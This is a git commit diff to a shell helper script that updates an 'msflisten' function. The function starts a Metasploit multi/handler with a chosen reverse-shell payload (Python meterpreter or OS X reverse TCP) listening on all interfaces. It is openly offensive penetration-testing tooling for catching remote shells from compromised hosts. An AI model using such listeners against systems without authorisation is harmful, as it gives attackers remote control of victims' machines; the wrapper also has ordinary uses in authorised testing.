4674f3c433f384ac13c49bb959ea45ebe6ca4a48
Sheharyar Naseer <hello@sheharyar.me>
2015-09-29 17:31:05 +0500

    Updated the msflisten function

--- MSF/functions.sh
+++ MSF/functions.sh
@@ -3,12 +3,29 @@
 
 msflisten() {
     if [[ $# -eq 0 ]] ; then
-        echo "port not provided"
-        echo "usage: msflisten <port>"
+        echo "usage: msflisten <type> <port>"
         echo ""
     else
-        local LPORT="$1"
-        ./msfconsole -x "use multi/handler; set PAYLOAD osx/x64/shell_reverse_tcp; set LHOST 0.0.0.0; set LPORT $LPORT; set ExitOnSession false; exploit -j"
+        local TYPE="$1"
+        local LPORT="$2"
+
+        case $TYPE in
+            py)
+                PAYLOAD="python/meterpreter/reverse_tcp" ;;
+
+            osx)
+                PAYLOAD="osx/x64/shell_reverse_tcp" ;;
+
+            *)
+                echo "Incorrect Payload Type"
+                return;;
+        esac
+
+        if [ -z "$LPORT" ] ; then
+            echo "No port given"
+        else
+            ./msfconsole -x "use multi/handler; set PAYLOAD $PAYLOAD; set LHOST 0.0.0.0; set LPORT $LPORT; set ExitOnSession false; exploit -j"
+        fi
     fi
 }
 
